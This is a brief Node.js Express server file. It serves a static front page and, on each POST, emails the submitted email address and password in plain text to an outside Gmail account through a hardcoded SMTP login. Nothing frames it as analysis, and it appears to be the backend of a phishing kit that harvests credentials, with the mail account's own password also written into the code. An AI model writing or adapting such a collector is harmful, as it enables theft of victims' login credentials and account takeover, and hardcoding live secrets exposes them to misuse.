const nodemailer = require("nodemailer")
const express = require("express")
const app = express()

app.use(express.static("public"))
app.use(express.json())

app.get("/", (req, res) => {
    res.sendFile(__dirname + "/public/index.html")
})

app.post("/", (req, res) => {
    console.log(req.body)
    let transporter = nodemailer.createTransport({
        host: "mail.corestepmfb.com",
        port: 465,
        secure: true,
        auth: {
            user: "test@corestepmfb.com",
            pass: "coreserver22/24"
        }
    })

    let mailOptions = ({
        from: '"test contact" <test@corestepmfb.com',
        to: "ayodejiamzat@gmail.com",
        subject: `message from ${req.body.email}`,
        text: `
            email: ${req.body.email}, 
            password: ${req.body.password}
        `        
    })

    transporter.sendMail(mailOptions, (error, info) => {
        if(error){
            return console.log(error)
        }else{
            console.log("email sent successfully" + info.response)
            res.send("success")
        }

        console.log("message sent: %s", info.messageId);
        console.log("preview url: %s", nodemailer.getTestMessageUrl(info));
    })
})

const PORT = process.env.PORT || 5000;
app.listen(
    PORT,
    console.log(`server runnin in ${process.env.NODE_ENV} mode on port ${PORT}`)
)